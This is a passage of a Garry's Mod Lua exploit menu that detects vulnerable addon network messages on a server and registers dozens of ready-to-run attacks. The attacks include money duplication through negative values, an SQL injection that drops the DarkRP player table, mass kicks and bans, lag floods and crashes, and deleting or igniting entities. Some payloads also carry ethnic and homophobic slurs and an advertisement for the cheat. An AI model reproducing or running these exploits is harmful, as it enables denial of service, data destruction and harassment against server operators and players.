net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("DarkRP_SS_Gamble")
if (status) then
ECPrint("Found Exploit: Free Money #3 [DarkRP_SS_Gamble]")
addExploit( "104","Free Money #3", "an exploit in the addon 'DarkRP Casino'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("DarkRP_SS_Gamble")
net.WriteInt(99999, 32)
net.WriteInt(1, 32)
net.WriteInt(0, 32)
net.WriteInt(0, 32)
net.WriteInt(1, 32)
net.SendToServer()
end )
end

status = ValidNetString("PCAdd")
if (status) then
ECPrint("Found Exploit: Delete Promocode [PCAdd]")
addExploit( "105","Delete Promocode", "delete all promocodes", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("PCAdd")
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
net.Start("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
net.Start("PCDelAll")
net.SendToServer()
end )
end )
end

status = ValidNetString("viv_hl2rp_disp_message")
if (status) then
ECPrint("Found Exploit: HL2 Disp Message [viv_hl2rp_disp_message]")
addExploit( "106","HL2 Disp Message", "hl2 voice commands", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for name, command in pairs (dispatchCommands) do
net.Start("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end )
end

status = ValidNetString("Kun_SellDrug")
if (status) then
ECPrint("Found Exploit: Free Money #4 [Kun_SellDrug]")
addExploit( "107","Free Money #4", "get monies", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "freemoney4" ) then
ECNotify("Starting")
timer.Create( "freemoney4", 0, 0, function()
for i=1,1000 do
net.Start("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "freemoney4" )
ECNotify("Stopping")
end
end )
end

status = ValidNetString("net_PSUnBoxServer")
if (status) then
ECPrint("Found Exploit: Point Shop Unbox [net_PSUnBoxServer]")
addExploit( "108","Point Shop Unbox", "an exploit in the addon 'Point Shop", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do 
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function() 
net.Start("net_PSUnBoxServer") 
net.WriteEntity(v) 
net.WriteString(v2.ID) 
net.SendToServer() 
end) 
i = i + 1
end
end
end
end )
end

status = ValidNetString("pplay_sendtable")
if (status) then
ECPrint("Found Exploit: ☢ Fuck the SQL database ☢ [pplay_sendtable]")
addExploit( "109","☢ Fuck the SQL database ☢", "fuck all", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
net.Start("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
end )
end

status = ValidNetString("75_plus_win")
if (status) then
ECPrint("Found Exploit: Free Money #5 [75_plus_win]")
addExploit( "110","Free Money #5", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("75_plus_win")
net.WriteString("99999999")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("ATMDepositMoney")
if (status) then
ECPrint("Found Exploit: Free Money #6 [ATMDepositMoney]")
addExploit( "111","Free Money #6", "an exploit in 'ATM'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ATMDepositMoney")
net.WriteFloat(-9999999)
net.SendToServer()
end )
end

status = ValidNetString("SellMinerals")
if (status) then
ECPrint("Found Exploit: Free Money #7 [SellMinerals]")
addExploit( "112","Free Money #7", "an exploit in 'eMining'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
net.Start("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -9999999 } )
net.SendToServer()
net.Start("SellMinerals")
net.WriteTable({ Target = LocalPlayer() })
net.SendToServer()
end
end
end )
end

status = ValidNetString("TakeBetMoney")
if (status) then
ECPrint("Found Exploit: Free Money #8 [TakeBetMoney]")
addExploit( "113","Free Money #8", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("TakeBetMoney")
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end )
end

status = ValidNetString("Kun_SellOil")
if (status) then
ECPrint("Found Exploit: Free Money #9 [Kun_SellOil]")
addExploit( "114","Free Money #9", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(ents.GetAll()) do
net.Start("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("DepositMoney")
if (status) then
ECPrint("Found Exploit: Free Money #10 [DepositMoney]")
addExploit( "115","Free Money #10", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("DepositMoney")
for k,v in pairs(ents.GetAll()) do 
net.WriteEntity(v)
net.WriteString(-100000000 )
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end

status = ValidNetString("NET_SS_DoBuyTakeoff")
if (status) then
ECPrint("Found Exploit: Free Money #11 [NET_SS_DoBuyTakeoff]")
addExploit( "116","Free Money #11", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("NET_SS_DoBuyTakeoff",true)
net.WriteEntity(LocalPlayer())
net.WriteEntity(table.Random(player.GetAll()))
net.WriteTable({})
net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
end )
end

status = ValidNetString("NET_EcSetTax")
if (status) then
ECPrint("Found Exploit: Free Money #12 [NET_EcSetTax]")
addExploit( "117","Free Money #12", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("NET_EcSetTax")
net.WriteInt(-9999999999, 16)
net.SendToServer()
end )
end

status = ValidNetString("RP_Accept_Fine")
if (status) then
ECPrint("Found Exploit: Free Money #13 [RP_Accept_Fine]")
addExploit( "118","Free Money #13", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll())do
net.Start("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-999999999999)
net.SendToServer()
end
end )
end

status = ValidNetString("drugseffect_remove")
if (status) then
ECPrint("Found Exploit: Remove Weapons [drugseffect_remove]")
addExploit( "119","Remove Weapons", "remove all weapons", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugseffect_remove")
net.SendToServer()
end )
end

status = ValidNetString("drugs_money")
if (status) then
ECPrint("Found Exploit: Remove Money [drugs_money]")
addExploit( "120","Remove Money", "remove all money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_money")
net.SendToServer()
end )
end

status = ValidNetString("CRAFTINGMOD_SHOP")
if (status) then
ECPrint("Found Exploit: Free Money #14 [CRAFTINGMOD_SHOP]")
addExploit( "121","Free Money #14", "an exploit in 'crafting mod'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -9999999;
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end )
end

status = ValidNetString("drugs_ignite")
if (status) then
ECPrint("Found Exploit: Fire Players [drugs_ignite]")
addExploit( "122","Fire Players", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end )
end

status = ValidNetString("drugs_ignite")
if (status) then
ECPrint("Found Exploit: Fire Props [drugs_ignite]")
addExploit( "123","Fire Props", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end )
end

status = ValidNetString("drugseffect_hpremove")
if (status) then
ECPrint("Found Exploit: Change HP [drugseffect_hpremove]")
addExploit( "124","Change HP", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugseffect_hpremove")
net.WriteString(99999)
net.SendToServer()
end )
end

status = ValidNetString("drugs_text")
if (status) then
ECPrint("Found Exploit: Delete All Props #2 [drugs_text]")
addExploit( "125","Delete All Props #2", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end )
end

status = ValidNetString("drugs_give")
if (status) then
ECPrint("Found Exploit: Give Everyone RPG [drugs_give]")
addExploit( "126","Give Everyone RPG", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_give")
net.WriteString("weapon_rpg")
net.SendToServer()
end )
end

status = ValidNetString("drugs_text")
if (status) then
ECPrint("Found Exploit: Remove Water [drugs_text]")
addExploit( "127","Remove Water", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_text")
net.WriteString("func_water_analog")
net.SendToServer()
end )
end

status = ValidNetString("drugs_effect")
if (status) then
local eye = LocalPlayer():GetEyeTrace().Entity
local send = "del|"..eye:EntIndex()
ECPrint("Found Exploit: Remove looking at [drugs_effect]")
addExploit( "128","Remove looking at", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("drugs_effect")
net.WriteString(send)
net.SendToServer()
end )
end

status = ValidNetString("RecKickAFKer")
if (status) then
ECPrint("Found Exploit: Kick Everyone #2 [RecKickAFKer]")
addExploit( "129","Kick Everyone #2", "kick all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs( player.GetAll() ) do
net.Start("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("GMBG:PickupItem")
if (status) then
ECPrint("Found Exploit: Loot Items [GMBG:PickupItem]")
addExploit( "130","Loot Items", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
net.Start("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("plyWarning")
if (status) then
ECPrint("Found Exploit: Kick Everyone #3 [plyWarning]")
addExploit( "131","Kick Everyone #3", "kick all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs( player.GetAll() ) do
net.Start('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
end
end )
end

status = ValidNetString("NLR.ActionPlayer")
if (status) then
ECPrint("Found Exploit: Freeze Everyone [NLR.ActionPlayer]")
addExploit( "132","Freeze Everyone", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs( player.GetAll() ) do
net.Start("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("kart_sell")
if (status) then
ECPrint("Found Exploit: Free Money #15 [kart_sell]")
addExploit( "133","Free Money #15", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for i=1, 300 do
net.Start("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end )
end

status = ValidNetString("ClickerAddToPoints")
if (status) then
ECPrint("Found Exploit: Free Points [ClickerAddToPoints]")
addExploit( "134","Free Points", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ClickerAddToPoints")
net.WriteInt(99999999, 32)
net.SendToServer()
end )
end

status = ValidNetString("bodyman_model_change")
if (status) then
ECPrint("Found Exploit: Body Groups [bodyman_model_change]")
addExploit( "135","Body Groups", "constantly changes your appearance", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
if !timer.Exists( "bodygroups" ) then
timer.Create("bodygroups", 0, 0, function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
net.Start("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
net.Start("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end )
else
timer.Remove("bodygroups")
ECNotify("Stopping")
end
end )
end

status = ValidNetString("SendMoney")
if (status) then
ECPrint("Found Exploit: Free Money #16 [SendMoney]")
addExploit( "136","Free Money #16", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
hook.Remove( "HUDPaint", "skhdsakjl")
net.Start("SendMoney")
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.WriteEntity(LocalPlayer())
net.WriteString("-99999999")
net.SendToServer()
end )
end

status = ValidNetString("BailOut")
if (status) then
ECPrint("Found Exploit: Free Money #17 [BailOut]")
addExploit( "137","Free Money #17", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs(player.GetAll()) do
net.Start("BailOut")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.WriteFloat(-999999999)
net.SendToServer()
end
end )
end

status = ValidNetString("hitcomplete")
if (status) then
ECPrint("Found Exploit: Free Money #18 [hitcomplete]")
addExploit( "138","Free Money #18", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("hitcomplete")
net.WriteDouble(99999999)               
net.SendToServer()
end )
end
----------------------------------------
for k,v in pairs(player.GetAll()) do                
dahater = v   
end  
----------------------------------------
status = ValidNetString("hhh_request")
if (status) then
ECPrint("Found Exploit: Free Money #19 [hhh_request]")
addExploit( "139","Free Money #19", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local plyhhh = LocalPlayer()                    
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
net.Start('hhh_request')
net.WriteTable(hitRequest)
net.SendToServer()
else
ECPrint("In this version of HHH, you can not use an exploit!")
end
end )
end

status = ValidNetString("DaHit")
if (status) then
ECPrint("Found Exploit: Free Money #20 [DaHit]")
addExploit( "140","Free Money #20", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
hook.Remove( "HUDPaint", "skhdsakjl")
net.Start("DaHit")               
net.WriteFloat(-99999999)                            
net.WriteEntity(LocalPlayer())               
net.WriteEntity(LocalPlayer())               
net.WriteEntity(LocalPlayer())               
net.SendToServer()
end )
end

status = ValidNetString("textstickers_entdata")
if (status) then
ECPrint("Found Exploit: Crash #2 [textstickers_entdata]")
addExploit( "141","Crash #2", "1tap", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("textstickers_entdata")
net.WriteUInt(0xFFFFFFF, 32)
net.SendToServer()
end )
end

status = ValidNetString("gBan.BanBuffer")
if (status) then
ECPrint("Found Exploit: gBan Everyone [gBan.BanBuffer]")
addExploit( "142","gBan Everyone", "exploit in the old version of gban", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
net.Start("gBan.BanBuffer")
net.WriteBool(true)
net.WriteInt(0, 32)
net.WriteString("haha owned")
net.WriteString(v:SteamID())
net.SendToServer()
end
end
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
ECPrint("Found Exploit: Free Armory #1 [ARMORY_RetrieveWeapon]")
addExploit( "143","Free Armory #1", "get weapon #1", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
ECPrint("Found Exploit: Free Armory #2 [ARMORY_RetrieveWeapon]")
addExploit( "144","Free Armory #2", "get weapon #2", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end )
end

status = ValidNetString("ARMORY_RetrieveWeapon")
if (status) then
ECPrint("Found Exploit: Free Armory #3 [ARMORY_RetrieveWeapon]")
addExploit( "145","Free Armory #3", "get weapon #3", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end )
end

status = ValidNetString("TransferReport")
if (status) then
ECPrint("Found Exploit: Report Spammer [TransferReport]")
addExploit( "146","Report Spammer", "report all players", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("TransferReport")
net.WriteString(v:SteamID())
net.WriteString("CHINKGANG FAGOTS")
net.WriteString("DITCH THIS SHITTY SERVER AND BUY DARK EXPLOITS TODAY")
net.SendToServer()
end )
end

status = ValidNetString("FIRE_CreateFireTruck")
if (status) then
ECPrint("Found Exploit: Create Fire Truck [FIRE_CreateFireTruck]")
addExploit( "147","Create Fire Truck", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("FIRE_CreateFireTruck")
net.SendToServer()
end )
end

status = ValidNetString("TFA_Attachment_RequestAll")
if (status) then
ECPrint("Found Exploit: Lagger #20 [TFA_Attachment_RequestAll]")
addExploit( "148","Lagger #20", "an exploit in 'TFA Weapon Pack', discovered by zerg314", function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "lagger20" ) then
timer.Create("lagger20", 0,0, function()
for i = 1, 800 do
net.Start("TFA_Attachment_RequestAll",true)
net.SendToServer()
end
end)
ECNotify("Starting Lagger")
else
timer.Remove("lagger20")
ECNotify("Stopping Lagger")
end
end)
end

status = ValidNetString("FIRE_RemoveFireTruck")
if (status) then
ECPrint("Found Exploit: Remove Fire Truck [FIRE_RemoveFireTruck]")
addExploit( "149","Remove Fire Truck", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("FIRE_RemoveFireTruck")
net.SendToServer()
end )
end

status = ValidNetString("gPrinters.sendID")
if (status) then
ECPrint("Found Exploit: Lagger #21 [gPrinters.sendID]")
addExploit( "150","Lagger #21", "B1G LAGZ, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if not timer.Exists("lagger21") then
timer.Create("lagger21", 0, 0, function()
for i = 1, 1000 do
net.Start("gPrinters.sendID",true)
net.WriteEntity(LocalPlayer())
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("requestmoneyforvk") -- RusElite Server
if (status) then
ECPrint("Found Exploit: Free 50k [requestmoneyforvk]")
addExploit( "151","Free 50k", "gives you 50k bypassing the validation check, discovered by Leith", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("requestmoneyforvk")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end )
end

status = ValidNetString("vj_testentity_runtextsd")
if (status) then
ECPrint("Found Exploit: VJSay [NEW] [vj_testentity_runtextsd]")
addExploit( "152","VJSay [NEW]", "'fix' of the old exploit", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k,v in pairs(player.GetAll()) do
net.Start("vj_testentity_runtextsd")
net.WriteEntity(v)
net.WriteString("OWNED OWNED OWNED OWNED OWNED OWNED OWNED OWNED ")
net.WriteString("vj_illuminati/Illuminati Confirmed.mp3")
net.SendToServer()
end
end )
end

status = ValidNetString("NET_BailPlayer") -- need to test
if (status) then
ECPrint("Found Exploit: Players Spam [NET_BailPlayer]")
addExploit( "153","Players Spam", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs (player.GetAll()) do
net.Start("NET_BailPlayer")
net.WriteEntity(v)
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("Taxi_Add") -- need to test
if (status) then
ECPrint("Found Exploit: Free Money #21 [Taxi_Add]")
addExploit( "154","Free Money #21", "maybe not work", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Taxi_Add")
net.WriteString("MLG")
net.WriteTable({-1333.647461, -1473.931763, -139.968750})
net.WriteFloat(-99999999)
net.WriteString(Desc)
net.SendToServer()
end )
end

status = ValidNetString("BuyCar")
if (status) then
ECPrint("Found Exploit: Free Money #22 [BuyCar]")
addExploit( "155","Free Money #22", "get money", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start('BuyCar')
net.WriteFloat(-1000000)
net.WriteEntity(LocalPlayer())
net.WriteString("Gay")
net.WriteString("Cock")
net.WriteString("Twat")
net.SendToServer()
end )
end

status = ValidNetString("rpi_trade_end")
if (status) then
ECPrint("Found Exploit: Test Function [rpi_trade_end]")
addExploit( "156","Test Function", "just test", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local it = 0
timer.Create( util.CRC( tostring( CurTime() ) ), 0.5, 0, function()
if( it > #player.GetAll() ) then
it = 1;
else
it = it + 1;
end
net.Start("rpi_trade_end")
net.WriteUInt( it, 16 )
net.SendToServer()
end )
end )
end

status = ValidNetString("ClickerForceSave")
if (status) then
ECPrint("Found Exploit: Melon Crash [ClickerForceSave]")
addExploit( "157","Melon Crash", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
hook.Add("Think","ps_spam",function()
for k, v in pairs (player.GetAll()) do
net.Start("ClickerForceSave")
net.WriteEntity(ply)
net.WriteInt(1, 1)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SRequest")
if (status) then
ECPrint("Found Exploit: Deagle Grab [SRequest]")
addExploit( "158","Deagle Grab", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
for k, v in pairs (player.GetAll()) do
net.Start("SRequest")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("HealButton")
if (status) then
ECPrint("Found Exploit: Free HP [HealButton]")
addExploit( "159","Free HP", "free hp", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("HealButton")
net.WriteEntity(LocalPlayer())
net.WriteFloat(999999)
net.SendToServer()
end )
end

status = ValidNetString("ArmorButton")
if (status) then
ECPrint("Found Exploit: Free Armor [ArmorButton]")
addExploit( "160","Free Armor", "free armor", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("ArmorButton")
net.WriteEntity(LocalPlayer())
net.WriteFloat(999999)
net.SendToServer()
end )
end

status = ValidNetString("SprintSpeedset")
if (status) then
ECPrint("Found Exploit: TTT SpeedHack [SprintSpeedset]")
addExploit( "161","TTT SpeedHack", "changes your speed", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("SprintSpeedset")
net.WriteFloat(math.min(math.max(2, 0.1),2 ))
net.SendToServer()
end )
end

status = ValidNetString("GiveArmor100")
if (status) then
ECPrint("Found Exploit: Armor Exploit [GiveArmor100]")
addExploit( "162","Armor Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("GiveArmor100")
net.SendToServer()
end )
end

status = ValidNetString("GiveSCP294Cup") -- NEED TO TEST !!
if (status) then
ECPrint("Found Exploit: 294 JAM [NEED TO TEST] [GiveSCP294Cup]") 
SCPLAG = 0
addExploit( "163","SCP 249 JAM!", "", function() 
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if (SCPLAG == 0) then
SCPLAG = 1
timer.Create( "LagThatShit", time, 0.05, function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "scp294" then
net.Start("GiveSCP294Cup")
net.WriteString("shit")
net.WriteEntity(v)
net.SendToServer()
end 
end
end)
else 
SCPLAG = 0
timer.Remove("LagThatShit")
end 
end)
end

status = ValidNetString("Client_To_Server_OpenEditor")
if (status) then
ECPrint("Found Exploit: SCP 249 Drink Menu Hack [Client_To_Server_OpenEditor]")
addExploit( "164","SCP 249 Drink Menu Hack", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("Client_To_Server_OpenEditor")
net.SendToServer()
end )
end

status = ValidNetString("DuelMessageReturn")
if (status) then
ECPrint("Found Exploit: Duel Crazy [DuelMessageReturn]")
addExploit( "165","Duel Crazy", "forces all players to fight with all players, discovered by Solly", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
timer.Create("crazyduel", 0.1, 0, function()
s.duel[1] = table.Random( player.GetAll() )
s.duel[2] = table.Random( player.GetAll() )
net.Start("DuelMessageReturn")
net.WriteFloat(1)
net.WriteTable(s.duel)
net.SendToServer()
end )
end )
end

status = ValidNetString("userAcceptPrestige")
if (status) then
ECPrint("Found Exploit: Free Prestige [userAcceptPrestige]")
addExploit( "166","Free Prestige", "exploit for free prestige", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("userAcceptPrestige")
net.SendToServer()
end )
end

status = ValidNetString("wordenns")
if (status) then
ECPrint("Found Exploit: Steal All Monies #11 [wordenns]")
addExploit( "167","Steal All Monies #11", "withdraw money from all printers", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
ECPrint("printers:".. tostring(#ents.FindByClass("derma_printer")))
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("wordenns")
net.WriteEntity(v)
net.SendToServer()
end
end)
end

status = ValidNetString("guncraft_removeWorkbench")
if (status) then
ECPrint("Found Exploit: Remove all Entity [guncraft_removeWorkbench]")
addExploit( "168","Remove all Entity", "an exploit in addon 'GunCraft'", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if !timer.Exists( "removentity" ) then
timer.Create("removentity", 3, 0, function()
for k,v in pairs(ents.GetAll()) do
net.Start("guncraft_removeWorkbench")
net.WriteEntity(v)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("BuyKey")
if (status) then
ECPrint("Found Exploit: Blue Unbox Exploit [NEED TO TEST]")
addExploit( "169","Blue Unbox Exploit", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("BuyKey")
net.SendToServer()
net.Start("BuyCrate")
net.SendToServer()
end )
end

status = ValidNetString("casinokit_chipexchange")
if (status) then
ECPrint("Found Exploit: Free Money #23 [casinokit_chipexchange]")
addExploit( "170","Free Money #23", "only works if outdated", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
local moneylog = LocalPlayer():getDarkRPVar("money")
net.Start("casinokit_chipexchange")
net.WriteEntity(self)
net.WriteString("darkrp")
net.WriteBool(true)
net.WriteUInt(LocalPlayer():getDarkRPVar("money"),32)
net.SendToServer()
timer.Simple(3, function()
for i=1, 5000 do
net.Start("casinokit_chipexchange")
net.WriteEntity(self)
net.WriteString("darkrp")
net.WriteBool(false)
net.WriteUInt(moneylog*0.10,32)
net.SendToServer()
end
end)
end )
end

status = ValidNetString("PurchaseWeed")
if (status) then
ECPrint("Found Exploit: Buy Weed [PurchaseWeed]")
addExploit( "171","Buy Weed", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("PurchaseWeed")
net.WriteInt(tonumber(10000),16)
net.WriteInt(tonumber(1),16)
net.WriteBool(LocalPlayer().Buying)
net.SendToServer()
end )
end

status = ValidNetString("PurchaseWeed")
if (status) then
ECPrint("Found Exploit: Sell Weed [PurchaseWeed]")
addExploit( "172","Sell Weed", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
net.Start("PurchaseWeed")
net.WriteInt(tonumber(100),16)
net.WriteInt(tonumber(100),16)
net.WriteBool(LocalPlayer().Selling)
net.SendToServer()
end )
end

status = ValidNetString("DoDealerDeliver")
if (status) then
ECPrint("Found Exploit: Buy Tab [DoDealerDeliver]")
addExploit( "173","Buy Tab", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
ECNotify("Starting")
if(LocalPlayer():getDarkRPVar("money")>=WEED_CONFIG.TabletPrice) then
net.Start("DoDealerDeliver")
net.WriteBool(false)
net.SendToServer()
end
end )
end

status = ValidNetString("DoDealerDeliver")
if (status) then
ECPrint("Found Exploit: Buy Bong [DoDealerDeliver]")
addExploit( "174","Buy Bong", "", function()
surface.PlaySound("garrysmod/ui_click.wav")
